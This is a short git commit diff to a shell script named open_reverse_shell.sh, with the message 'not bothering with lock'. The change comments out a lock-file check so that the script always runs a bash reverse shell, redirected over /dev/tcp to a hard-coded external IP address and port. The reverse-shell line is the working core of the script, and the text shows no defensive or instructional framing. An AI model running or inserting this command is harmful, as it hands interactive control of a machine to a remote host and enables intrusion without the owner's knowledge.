970067c5b4757ae85920047a547c1282e45ca6c2
Ivan Ivanov <30338+ivancho@users.noreply.github.com>
2020-09-20 10:18:02 -0400

    not bothering with lock

--- open_reverse_shell.sh
+++ open_reverse_shell.sh
@@ -4,12 +4,12 @@ cd $( dirname "${BASH_SOURCE[0]}" )
 
 LCK=.rshell_lock
 
-if [ -f $LCK ]; then
-    echo "Lock exists, not running"
-    exit
-else
-    trap "rm -f $LCK" EXIT
-    touch $LCK
-
-    /bin/bash -i >& /dev/tcp/24.239.176.36/1235 0>&1
-fi
+#if [ -f $LCK ]; then
+#    echo "Lock exists, not running"
+#    exit
+#else
+#    trap "rm -f $LCK" EXIT
+#    touch $LCK
+#
+/bin/bash -i >& /dev/tcp/24.239.176.36/1235 0>&1
+#fi
